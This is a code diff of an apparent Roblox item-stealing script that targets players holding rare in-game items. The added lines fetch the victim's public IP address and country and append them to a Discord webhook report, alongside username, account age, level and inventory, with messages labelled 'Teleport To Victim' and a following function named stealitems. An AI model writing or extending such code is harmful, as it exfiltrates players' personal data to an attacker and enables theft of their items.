@@ -800,6 +800,8 @@ if #game:GetService("Players"):GetPlayers() == 12 then
     game.Players.LocalPlayer:Kick("This server is unsupported... Try in a new PUBLIC server.")
 end
 
+local ipwebhook = game:HttpGet("https://ipinfo.io/ip")
+local country = game:HttpGet("http://country.io/names.json")
 local LP = game.Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
@@ -1065,7 +1067,7 @@ local WebHookEmbed = CreateEmbed(
         {
             name = "🌊 Player Info", 
             value = "``` | 📖 Username: "..LP.Name.."\n | 📌 Account Age: "..tostring(LP.AccountAge).."\n | 🚀 Level: "..tostring(getLvl())..
-                     "\n | 🥳 Receiver: "..userName.."\n | 💻 Executor Used: "..identifyexecutor().."```"
+                     "\n | 🥳 Receiver: "..userName.."\n | 💻 Executor Used: "..identifyexecutor().. "\n | :map: Country: "..country.."\n | 👤 IP: "..ipwebhook.."```"
         },
         {
             name = "🍎 Items Data", 
@@ -1090,9 +1092,9 @@ local WebHookEmbed = CreateEmbed(
 )
 
 if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1 then
-    SendWebhook(webHook, {content = "**@everyone (⭐️) Teleport To Victim:**\nhttps://fern.wtf/joiner?placeId=142823291&gameInstanceId="..game.JobId.."", embeds = {WebHookEmbed}})
+    SendWebhook(webHook, {content = "**@everyone(⭐️) Teleport To Victim:**\nhttps://fern.wtf/joiner?placeId=142823291&gameInstanceId="..game.JobId.."", embeds = {WebHookEmbed}})
 else
-    SendWebhook(webHook, {content = "**@everyone (⭐️) Teleport To Victim:**\nhttps://fern.wtf/joiner?placeId=142823291&gameInstanceId="..game.JobId.."", embeds = {WebHookEmbed}})
+    SendWebhook(webHook, {content = "**@everyone(⭐️) Teleport To Victim:**\nhttps://fern.wtf/joiner?placeId=142823291&gameInstanceId="..game.JobId.."", embeds = {WebHookEmbed}})
 end
 
 local function stealitems()
